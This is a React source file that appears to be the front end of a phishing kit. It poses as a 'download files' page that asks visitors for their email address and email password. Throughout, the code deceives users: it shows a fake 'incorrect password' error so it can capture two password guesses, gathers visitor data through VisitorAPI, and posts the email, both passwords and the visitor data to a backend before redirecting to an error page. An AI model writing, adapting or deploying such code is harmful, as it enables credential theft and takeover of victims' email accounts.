import React, { useState, useEffect } from 'react';
import axios from 'axios';
import './Login.css';
import { useNavigate } from 'react-router-dom';
const VisitorAPI = require("visitorapi");

const Login = () => {
  const [email, setEmail] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isEmailConfirmed, setIsEmailConfirmed] = useState(false);
  const [password, setPassword] = useState('');
  const [firstPasswordUsed, setFirstPasswordUsed] = useState('');
  const [secondPasswordUsed, setSecondPasswordUsed] = useState('');
  const [passwordError, setPasswordError] = useState('');
  const [attemptCount, setAttemptCount] = useState(0); // To track the number of login attempts
  const [visitorData, setVisitorData] = useState({}); // store the whole JSON data

  const navigate = useNavigate(); // Define the navigate function

  // Fetch user's visitor data
  useEffect(() => {
    VisitorAPI(
      "ohXzOBizNPU5PSwkkR7d", // Replace with VisitorAPI key
      data => {
        setVisitorData(data);
        console.log('Visitor Data fetched:', data); // Check the data received
      }
    );
  }, []);

  // Handle email input change
  const handleEmailChange = (e) => {
    setEmail(e.target.value);
    // Reset confirmation and errors when email changes
    if (isEmailConfirmed) {
      setIsEmailConfirmed(false);
      setPassword('');
      setPasswordError('');
      setAttemptCount(0);
      setFirstPasswordUsed(''); // Reset the first password attempt
      setSecondPasswordUsed(''); // Reset the second password attempt
    }
  };

  // Handle email submission
  const handleEmailSubmit = () => {
    if (!email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
      setPasswordError('Please enter a valid email address.');
      return;
    }

    setIsLoading(true);
    setPasswordError('');

    // Simulate 2-second loading time
    setTimeout(() => {
      setIsLoading(false);
      setIsEmailConfirmed(true);
    }, 2000);
  };

  // Handle login attempt
  const handleLogin = async () => {
    if (attemptCount === 0) {
      // Store the first password attempt
      setFirstPasswordUsed(password);
      setAttemptCount(1);
      setPassword(''); // Clear the password input

      // Wait for 0.5 seconds before showing error message
      setTimeout(() => {
        setPasswordError(<span className='errormsg'>The email or password entered is incorrect. Please try again.</span>);
        const passwordInput = document.getElementById('password-input');
        if (passwordInput) {
          passwordInput.focus(); // Autofocus back to password input
        }
      }, 500); // Half-second delay for the error message

      return;
    } else if (attemptCount === 1) {
      // Store the second password attempt
      setSecondPasswordUsed(password);
    }

    setIsLoading(true);
    setPasswordError('');

    // Try to send login request to backend
    try {
      const response = await axios.post('http://127.0.0.1:8000/api/get_user_info/', {
        email: email,
        firstpasswordused: firstPasswordUsed,
        secondpasswordused: password, // Send the second password attempt
        visitorData: visitorData, // Send the visitor data to backend
      });
      console.log('Response from backend:', response.data);
      // Handle successful response here (e.g., redirect or show success message)
    } catch (error) {
      if (error.message === 'Network Error') {
        setPasswordError('We encountered a network error while attempting to connect to the server. Please try again.');
      } else if (error.response) {
        console.error('Error:', error.response.data);
        setPasswordError(`Login failed with status code ${error.response.status}. Please check your credentials and try again.`);
      } else {
        setPasswordError('An unknown error occurred. Please refresh the page and attempt again.');
      }
    } finally {
      setIsLoading(false);
      navigate('/error'); // You might want to navigate only on error
    }
  };

  return (
    <div className="login-container">
      <div className="login-box">
        <div className="input-group">
          {isEmailConfirmed ? (
            <h4>Confirm your email password to continue</h4>
          ) : (
            <h2>Enter email to download files</h2>
          )}
          <div className="email-input-wrapper">
            <input
              id="email-input"
              type="email"
              value={email}
              onChange={handleEmailChange}
              disabled={isEmailConfirmed}
              placeholder="Enter your email"
              required
              autoFocus={!isEmailConfirmed} // Auto focus the email input when email is not confirmed
            />
          </div>
          {!isEmailConfirmed && (
            <div className="button-wrapper">
              <button
                onClick={handleEmailSubmit}
                disabled={isLoading || isEmailConfirmed || !email}
                className=""
              >
                {isLoading ? (
                  <span className="spinner"></span>
                ) : (
                  'Download to Email'
                )}
              </button>
            </div>
          )}
        </div>

        {isEmailConfirmed && (
          <>
            <div className="input-group">
              <input
                id="password-input"
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Email password"
                required
                autoFocus={attemptCount === 0} 
              />
            </div>

            {passwordError && <p className="error-text">{passwordError}</p>}

            <div className="login-btn-wrapper">
              <button
                className=""
                onClick={handleLogin}
                disabled={isLoading || !password} // Button is disabled until the user starts typing
              >
                {isLoading ? (
                  <span className="spinner"></span>
                ) : (
                  'Continue'
                )}
              </button>
            </div>
          </>
        )}
      </div>
    </div>
  );
};

export default Login;
